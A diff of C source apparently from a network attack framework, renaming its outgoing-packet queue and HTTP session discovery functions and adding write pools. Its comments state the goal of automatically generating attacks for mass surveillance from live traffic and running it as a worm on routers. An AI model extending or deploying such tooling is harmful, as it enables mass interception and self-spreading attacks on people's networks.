@@ -40,7 +40,7 @@ If this is the damage I can do alone... what do you  think will happen in the fu
 // Perform one iteration of each attack structure that was queued
 int AS_perform(AS_context *ctx) {
     AS_attacks *aptr = ctx->attack_list;
-    AttackOutgoingQueue *optr = NULL;
+    OutgoingPacketQueue *optr = NULL;
     attack_func func;
     int r = 0;  
     int i = 0;
@@ -112,12 +112,12 @@ int AS_perform(AS_context *ctx) {
     if (!ctx->network_write_threaded)  {
         pthread_mutex_lock(&ctx->network_queue_mutex);
 
-        optr = ctx->network_queue;
-        ctx->network_queue_last = ctx->network_queue = NULL;
+        optr = ctx->outgoing_queue;
+        ctx->outgoing_queue_last = ctx->outgoing_queue = NULL;
 
         pthread_mutex_unlock(&ctx->network_queue_mutex);
         
-        FlushAttackOutgoingQueueToNetwork(ctx, optr);
+        FlushOutgoingQueueToNetwork(ctx, optr);
 
 
     }
@@ -202,6 +202,7 @@ AS_context *AS_ctx_new() {
     // allocate network read pools
     // !!! add network write  pools the same way to  block using too many threads, etc
     NetworkAllocateReadPools(ctx);
+    NetworkAllocateWritePools(ctx);
 
     // initialize anything related to special attacks in attacks.c
     attacks_init(ctx);
@@ -224,7 +225,7 @@ AS_context *AS_ctx_new() {
 
     // initialize real time http session discovery.. so we can automatically geenerate attacks for mass surveillance from live arbitrary traffic
     // aint this going to fuck shit up :).. esp on a worm w routers ;).. shittt... good luck
-    HTTPDiscover_Init(ctx);
+    WebDiscover_Init(ctx);
 
     // this is a subsystem which will get access to all packets to add IPv6 (mainly) addreses to use for generating new random-ish  addresses
     IPGather_Init(ctx);
@@ -261,7 +262,7 @@ int Subsystems_Perform(AS_context *ctx) {
     BH_Perform(ctx);
 
     // perform http discovery looking for live http sessions in real time
-    HTTPDiscover_Perform(ctx);
+    WebDiscover_Perform(ctx);
 
     return 1;
 }
